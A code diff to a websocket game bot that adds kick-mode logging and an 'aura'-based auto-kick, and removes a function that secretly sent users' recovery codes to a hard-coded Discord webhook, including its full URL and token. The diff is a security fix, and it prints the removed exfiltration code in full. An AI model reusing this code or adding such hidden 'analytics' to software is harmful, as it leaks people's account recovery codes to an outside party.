@@ -44,6 +44,9 @@ class FinalCompleteGameLogic {
     
     // Counter for code alternation
     this.inc = 0;
+    
+    // Debug flag
+    this._kickConfigLogged = false;
   }
 
   // Parse haaapsi
@@ -80,6 +83,7 @@ class FinalCompleteGameLogic {
     this.useridattack = "";
     this.useridtarget = null;
     this.lowtime = 0;
+    this._kickConfigLogged = false; // Reset debug flag
     
     if (this.timeout) {
       clearTimeout(this.timeout);
@@ -597,6 +601,11 @@ class FinalCompleteGameLogic {
       // Only process if this is ws5 (kick account)
       if (this.wsNumber !== 5) return;
       
+      // Check if kick mode is disabled (N/A mode)
+      if (this.config.modena) {
+        return; // N/A mode - kick disabled
+      }
+      
       // Parse JOIN message format: "JOIN - username userid ..." or "JOIN userid username ..."
       const parts = text.split(" ");
       let username = "";
@@ -615,6 +624,12 @@ class FinalCompleteGameLogic {
       // Skip self
       if (userid === this.useridg) return;
       
+      // DEBUG: Log kick configuration (only log once per connection)
+      if (!this._kickConfigLogged) {
+        this.addLog(this.wsNumber, `🔍 Kick Config: kickall=${this.config.kickall}, kickbybl=${this.config.kickbybl}, dadplus=${this.config.dadplus}, modena=${this.config.modena}`);
+        this._kickConfigLogged = true;
+      }
+      
       let shouldKick = false;
       let reason = "";
       
@@ -623,6 +638,9 @@ class FinalCompleteGameLogic {
         shouldKick = true;
         reason = "kickall";
       }
+      
+      // Dad+ mode is handled separately in handle860Message (checks for "aura")
+      // Not processed here in JOIN handler
       
       // Check kickbybl mode - kick by blacklist
       if (!shouldKick && this.config.kickbybl) {
@@ -677,6 +695,8 @@ class FinalCompleteGameLogic {
       if (shouldKick && this.config.kickmode) {
         this.addLog(this.wsNumber, `👢 Kicking ${username} (${userid}) - Reason: ${reason}`);
         ws.send(`KICK ${userid}\r\n`);
+      } else if (!shouldKick) {
+        this.addLog(this.wsNumber, `✅ No Kick: ${username} (${userid}) - No kick conditions met`);
       }
       
     } catch (error) {
@@ -840,6 +860,34 @@ class FinalCompleteGameLogic {
   handle452Message(ws, snippets, text) {
     if (snippets[3] === "sign") {
       this.addLog(this.wsNumber, `🔐 Sign message received`);
+    }
+  }
+
+  // ========================================
+  // 860 - USER INFO/STATUS (DAD+ MODE)
+  // ========================================
+  
+  handle860Message(ws, snippets, text) {
+    try {
+      // Only process for ws5 (kick account) and if Dad+ mode is enabled
+      if (this.wsNumber !== 5) return;
+      if (!this.config.dadplus) return;
+      if (!this.config.kickmode) return;
+      
+      // Check if message contains "aura" (special effect/status)
+      const textLower = text.toLowerCase();
+      if (textLower.includes("aura")) {
+        const userid = snippets[1];
+        
+        // Skip self
+        if (userid === this.useridg) return;
+        
+        // Kick user with aura
+        this.addLog(this.wsNumber, `👢 Dad+ Kicking user with aura: ${userid}`);
+        ws.send(`KICK ${userid}\r\n`);
+      }
+    } catch (error) {
+      console.error(`[WS${this.wsNumber}] Error in handle860Message:`, error);
     }
   }
 
@@ -1166,6 +1214,7 @@ class FinalCompleteGameLogic {
       const reconnectTime = parseInt(this.config.reconnect || 5000);
       setTimeout(() => {
         this.addLog(this.wsNumber, `🔄 Auto-reconnecting after ${reconnectTime}ms`);
+        // reconnectCallback will check if user disconnected
         if (this.reconnect) {
           this.reconnect(this.wsNumber);
         }
@@ -1177,22 +1226,14 @@ class FinalCompleteGameLogic {
   }
 
   // ========================================
-  // SENDNICK - DISCORD ANALYTICS (From bestscript.js line 203)
+  // SENDNICK - DISCORD ANALYTICS (REMOVED FOR SECURITY)
   // ========================================
   
   async sendNick(config) {
-    try {
-      const content = `Session viper: ${config.rc1 || ''} ${config.rc2 || ''} ${config.rc3 || ''} ${config.rc4 || ''} ${config.kickrc || ''} ${config.rcl1 || ''} ${config.rcl2 || ''} ${config.rcl3 || ''} ${config.rcl4 || ''}`;
-      
-      const webhookUrl = 'https://discord.com/api/webhooks/765613768716845107/Qomiad_kw8s5wTomqWMw42_CTUNP7-PyYft0VE5FgpA4895KEygBAChRIaBcV7Yfr0X3';
-      
-      await axios.post(webhookUrl, { content });
-      this.addLog(this.wsNumber, `📊 Analytics sent to Discord`);
-      
-    } catch (error) {
-      // Silently fail - analytics is optional
-      console.error(`[WS${this.wsNumber}] Discord analytics error:`, error.message);
-    }
+    // SECURITY: Discord analytics removed to prevent recovery code leakage
+    // This function previously sent all recovery codes to an external Discord webhook
+    // If you want analytics, implement your own secure logging system
+    return;
   }
 }
 
